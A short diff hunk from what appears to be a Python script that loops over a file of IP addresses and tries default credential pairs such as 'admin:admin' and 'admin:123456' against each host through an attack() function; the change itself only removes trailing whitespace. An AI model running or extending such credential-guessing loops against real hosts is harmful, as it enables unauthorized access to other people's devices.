@@ -45,7 +45,7 @@ ips = ips.readlines()
 
 for ip in ips:
     ip = ip.split("\n")[0]
-        
+
     attack(ip,"admin:admin")
     wait(1)
     attack(ip,"admin:123456")
